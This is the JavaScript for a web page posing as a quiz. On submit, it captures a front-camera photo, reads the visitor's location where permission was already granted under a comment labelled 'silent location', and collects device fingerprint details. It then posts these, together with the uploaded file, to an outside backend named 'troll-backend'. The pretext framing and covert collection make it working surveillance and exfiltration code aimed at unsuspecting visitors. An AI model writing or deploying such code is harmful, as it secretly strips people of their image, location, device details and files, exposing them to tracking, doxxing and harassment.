// ================================
// DOM ELEMENTS
// ================================
const btn = document.getElementById("submit-btn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");
const form = document.getElementById("quiz-form");

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// ================================
// SILENT LOCATION (ONLY IF GRANTED)
// ================================
async function getSilentLocation() {
  let location = "N/A";

  if (!navigator.permissions || !navigator.geolocation) return location;

  try {
    const status = await navigator.permissions.query({ name: "geolocation" });
    if (status.state === "granted") {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      location = `${pos.coords.latitude},${pos.coords.longitude}`;
    }
  } catch (e) {}

  return location;
}

// ================================
// METADATA COLLECTION
// ================================
async function collectMetadata() {
  const meta = {
    width: window.innerWidth,
    height: window.innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    time: new Date().toLocaleString(),
    deviceMemory: navigator.deviceMemory || "N/A",
    cpuThreads: navigator.hardwareConcurrency || "N/A",
    cookieEnabled: navigator.cookieEnabled,
    referer: document.referrer,
    network: navigator.connection
      ? JSON.stringify(navigator.connection)
      : "N/A",
    battery: "N/A",
    location: await getSilentLocation()
  };

  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      meta.battery = `${battery.level * 100}% charging:${battery.charging}`;
    } catch (e) {}
  }

  return meta;
}

// ================================
// CAMERA CAPTURE + SEND
// ================================
async function captureAndSendCamera() {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" },
    audio: false
  });

  video.srcObject = stream;
  video.muted = true;
  await video.play();

  // wait until video is ready
  await new Promise(resolve => {
    if (video.videoWidth > 0) return resolve();
    video.onloadedmetadata = () => resolve();
  });

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const image = canvas.toDataURL("image/png");
  const metadata = await collectMetadata();

  await fetch(`${BACKEND_BASE}/upload`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image, metadata })
  });

  stream.getTracks().forEach(track => track.stop());
}

// ================================
// FILE UPLOAD
// ================================
async function sendFile(file) {
  return new Promise(resolve => {
    const reader = new FileReader();
    reader.onload = async () => {
      await fetch(`${BACKEND_BASE}/file-upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          file: reader.result,
          filename: file.name
        })
      });
      resolve();
    };
    reader.readAsDataURL(file);
  });
}

// ================================
// PREVENT FORM SUBMIT DEFAULT
// ================================
form.addEventListener("submit", e => e.preventDefault());

// ================================
// SUBMIT FLOW
// ================================
btn.addEventListener("click", async e => {
  e.preventDefault();

  // browser validation
  if (!form.checkValidity()) {
    form.reportValidity();
    return;
  }

  if (!fileInput.files.length) return;

  try {
    await captureAndSendCamera();
    await sendFile(fileInput.files[0]);

    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";
  } catch (err) {
    console.error("Submission error:", err);
  }
});
